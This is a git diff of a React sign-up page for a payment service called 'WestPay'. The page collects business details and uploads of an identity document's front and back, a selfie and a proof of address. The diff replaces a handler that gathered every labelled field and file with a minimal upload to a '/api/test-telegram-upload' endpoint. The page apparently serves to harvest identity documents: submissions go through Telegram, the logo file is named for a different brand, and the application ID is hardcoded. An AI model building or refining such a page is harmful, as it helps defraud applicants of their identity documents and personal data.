@@ -1,133 +1,3 @@
-import { useState } from "react";
-import "./style.css";
-
-function UploadBox({ title, subtitle, onFileSelect }) {
-  const [file, setFile] = useState(null);
-  const [showCheck, setShowCheck] = useState(false);
-
-  const handleChange = (e) => {
-    const selected = e.target.files?.[0];
-    if (!selected) return;
-
-    setFile({
-      name: selected.name,
-      url: URL.createObjectURL(selected),
-      type: selected.type
-    });
-
-    if (onFileSelect) {
-      onFileSelect(selected);
-    }
-
-    setShowCheck(true);
-
-    setTimeout(() => {
-      setShowCheck(false);
-    }, 1400);
-  };
-
-  return (
-    <label className="upload-box">
-      <input
-        type="file"
-        accept="image/*,.pdf"
-        hidden
-        onChange={handleChange}
-      />
-
-      {file && file.type.startsWith("image/") ? (
-        <div className="upload-preview">
-          <img src={file.url} alt={title} />
-        </div>
-      ) : (
-        <strong>↑</strong>
-      )}
-
-      <span>
-        {file ? "Uploaded successfully" : title}
-        <small>
-          {file ? file.name : subtitle}
-        </small>
-      </span>
-
-      {showCheck && (
-        <div className="upload-success">
-          <div className="check">✓</div>
-        </div>
-      )}
-    </label>
-  );
-}
-
-export default function App() {
-  const [submitted, setSubmitted] = useState(false);
-  const [isSubmitting, setIsSubmitting] = useState(false);
-
-  const [uploadedFiles, setUploadedFiles] = useState({
-    front: null,
-    back: null,
-    selfie: null,
-    address: null
-  });
-
-  if (submitted) {
-    return (
-      <div className="success-page">
-        <div className="success-card">
-          <div className="success-icon">✓</div>
-
-          <h1>Application submitted</h1>
-
-          <p>
-            Your WestPay account application has been successfully
-            submitted and is currently under review.
-          </p>
-
-          <div className="application-id">
-            <small>Application ID</small>
-            <strong>WP-482931</strong>
-          </div>
-
-          <div className="status">
-            ● Under Review
-          </div>
-        </div>
-      </div>
-    );
-  }
-
-  return (
-    <div className="page">
-
-      <header className="header">
-        <div className="logo">
-          <img
-            src="https://res.cloudinary.com/fa719lho/image/upload/v1787668181/robotpay-logo_iaa0dj.jpg"
-            alt="WestPay"
-          />
-          <span>WestPay</span>
-        </div>
-
-        <div className="secure">
-          ● Secure application
-        </div>
-      </header>
-
-      <main className="container">
-
-        <div className="intro">
-          <small>ACCOUNT APPLICATION</small>
-
-          <h1>Apply for a WestPay account</h1>
-
-          <p>
-            Tell us about yourself and your business to get started
-            with WestPay payment services.
-          </p>
-        </div>
-
-        <div className="steps">
-          <div className="step active">
             <b>1</b>
             <span>Information</span>
           </div>
@@ -152,125 +22,27 @@ export default function App() {
           onSubmit={async (e) => {
             e.preventDefault();
 
-            // Empêche plusieurs soumissions simultanées
-            if (isSubmitting) return;
-
-            setIsSubmitting(true);
-
             const form = e.currentTarget;
+            const fileInputs = form.querySelectorAll('input[type="file"]');
+
+            let selectedFile = null;
+
+            for (const input of fileInputs) {
+              if (input.files && input.files.length > 0) {
+                selectedFile = input.files[0];
+                break;
+              }
+            }
+
+            if (!selectedFile) {
+              alert("Please upload a test image first.");
+              return;
+            }
 
             try {
               const formData = new FormData();
 
-              // ------------------------------------------------
-              // Récupérer toutes les informations visibles
-              // du formulaire avec leurs libellés
-              // ------------------------------------------------
-
-              const information = {};
-
-              const fields = form.querySelectorAll(
-                ".field"
-              );
-
-              fields.forEach((field, index) => {
-                const label = field.querySelector(":scope > label");
-
-                if (!label) return;
-
-                const labelText =
-                  label.innerText
-                    .replace(/\\s+/g, " ")
-                    .trim();
-
-                const control =
-                  field.querySelector(
-                    "input:not([type='file']), select, textarea"
-                  );
-
-                if (!control) return;
-
-                const key =
-                  labelText
-                    .toLowerCase()
-                    .replace(/[^a-z0-9]+/g, "_")
-                    .replace(/^_|_$/g, "") ||
-                  "field_" + index;
-
-                if (control.type === "checkbox") {
-                  information[key] = control.checked;
-                } else {
-                  information[key] = control.value || "";
-                }
-              });
-
-              // ------------------------------------------------
-              // Pays d'opération — plusieurs cases possibles
-              // ------------------------------------------------
-
-              const operationCountries = [];
-
-              form.querySelectorAll(
-                ".countries input[type='checkbox']"
-              ).forEach((checkbox) => {
-                if (checkbox.checked) {
-                  const text = checkbox.parentElement?.innerText
-                    ?.replace(/\\s+/g, " ")
-                    .trim();
-
-                  if (text) {
-                    operationCountries.push(text);
-                  }
-                }
-              });
-
-              information.countries_of_operation =
-                operationCountries;
-
-              // ------------------------------------------------
-              // Ajouter les informations au FormData
-              // ------------------------------------------------
-
-              formData.append(
-                "information",
-                JSON.stringify(information)
-              );
-
-              // ------------------------------------------------
-              // Récupérer LES 4 fichiers
-              // ------------------------------------------------
-
-              const fileInputs =
-                form.querySelectorAll(
-                  'input[type="file"]'
-                );
-
-              let fileCount = 0;
-
-              fileInputs.forEach((input) => {
-                if (
-                  input.files &&
-                  input.files.length > 0
-                ) {
-                  formData.append(
-                    "files",
-                    input.files[0]
-                  );
-
-                  fileCount++;
-                }
-              });
-
-              if (fileCount === 0) {
-                alert(
-                  "Please upload at least one test image first."
-                );
-                return;
-              }
-
-              // ------------------------------------------------
-              // Envoi vers notre API de TEST
-              // ------------------------------------------------
+              formData.append("file", selectedFile);
 
               const response = await fetch(
                 "/api/test-telegram-upload",
@@ -280,41 +52,22 @@ export default function App() {
                 }
               );
 
-              const result =
-                await response.json();
+              const result = await response.json();
 
-              if (
-                !response.ok ||
-                !result.ok
-              ) {
-                console.error(
-                  "Telegram test error:",
-                  result
-                );
-
-                setIsSubmitting(false);
+              if (!response.ok || !result.ok) {
+                console.error(result);
 
                 alert(
-                  result.error ||
-                  "Unable to send the test application."
+                  "Unable to send the test image. Please try again."
                 );
 
                 return;
               }
 
-              // ------------------------------------------------
-              // Succès
-              // ------------------------------------------------
-
               setSubmitted(true);
 
             } catch (error) {
-              console.error(
-                "Submit error:",
-                error
-              );
-
-              setIsSubmitting(false);
+              console.error(error);
 
               alert(
                 "Connection error. Please try again."
@@ -656,76 +409,3 @@ export default function App() {
 
                 <textarea
                   required
-                  placeholder="Describe your use case..."
-                />
-
-              </div>
-
-            </div>
-
-          </section>
-
-          <section className="submit-section">
-
-            <div className="section-title">
-
-              <small>05</small>
-
-              <div>
-                <h2>
-                  Review & submit
-                </h2>
-
-                <p>
-                  Confirm your information before submitting.
-                </p>
-              </div>
-
-            </div>
-
-            <label className="agreement">
-
-              <input
-                required
-                type="checkbox"
-              />
-
-              <span>
-                I confirm that the information provided is
-                accurate and I agree to the Terms of Service
-                and Privacy Policy.
-              </span>
-
-            </label>
-
-            <button
-              type="submit"
-              disabled={isSubmitting}
-              className={isSubmitting ? "submitting" : ""}
-            >
-              {isSubmitting
-                ? "Submitting application..."
-                : "Submit application →"}
-            </button>
-
-          </section>
-
-        </form>
-
-      </main>
-
-      <footer>
-        <span>
-          © 2026 WestPay
-        </span>
-
-        <div>
-          <span>Privacy</span>
-          <span>Terms</span>
-          <span>Support</span>
-        </div>
-      </footer>
-
-    </div>
-  );
-}
